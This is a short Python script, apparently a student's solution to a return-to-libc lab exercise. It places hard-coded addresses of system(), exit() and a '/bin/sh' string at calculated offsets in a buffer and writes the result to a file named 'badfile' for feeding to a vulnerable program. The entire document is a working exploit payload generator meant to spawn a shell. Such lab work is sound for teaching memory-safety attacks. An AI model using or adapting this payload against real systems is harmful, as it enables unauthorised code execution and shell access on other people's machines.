#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

# --- ADDRESSES FOUND IN TASK 1 & 2 ---
sh_addr = 0xffffd410
system_addr = 0xf7e12420
exit_addr = 0xf7e04f80

# --- CALCULATED OFFSETS ---
Y = 28 # Offset for System Address
Z = 32 # Offset for Exit Address (Y + 4)
X = 36 # Offset for /bin/sh Address (Z + 4)

# --- CONSTRUCTING THE PAYLOAD ---

# Place the address of "/bin/sh" at offset X
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

# Place the address of system() at offset Y
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

# Place the address of exit() at offset Z
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
 f.write(content)